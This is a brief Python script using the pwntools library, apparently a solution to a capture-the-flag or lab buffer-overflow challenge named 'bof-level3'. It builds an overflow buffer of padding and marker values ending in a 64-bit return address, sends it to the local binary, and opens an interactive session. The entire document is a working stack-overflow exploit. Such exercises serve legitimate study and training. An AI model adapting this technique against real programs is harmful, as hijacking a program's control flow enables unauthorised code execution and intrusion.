#!/usr/bin/env python

from pwn import *

p = process("./bof-level3")

print(p.recv())

buff = "A" * 32
buff += "ABCDEFGH"
buff += "abcdefgh"
buff += "A" * 8
buff += p64(0x4006e0)

p.sendline(buff)

p.interactive()
